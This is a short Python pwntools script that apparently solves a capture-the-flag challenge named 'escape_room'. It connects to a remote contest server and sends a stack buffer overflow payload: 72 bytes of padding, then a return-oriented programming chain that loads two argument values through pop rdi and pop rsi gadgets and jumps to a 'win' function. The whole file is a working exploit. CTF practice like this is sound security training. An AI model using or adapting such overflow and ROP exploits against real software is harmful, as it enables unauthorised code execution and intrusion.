#!/usr/bin/env python3
from pwn import *
# win address = 0x0040121b
# RIP offset = 72

context.binary = elf = ELF('./escape_room', checksec=False)

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13570)

# Your exploit here
win_addr = 0x0040121b
pop_rdi = 0x00401287
pop_rsi = 0x00401289
ret = 0x0040101a

arg_1 = 0xdeadbeef
arg_2 = 0xcafebabe

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(arg_1)
payload += p64(pop_rsi)
payload += p64(arg_2)
payload += p64(ret)
payload += p64(win_addr)

#p.recvuntil(b'keys?')
p.sendline(payload)
p.interactive()
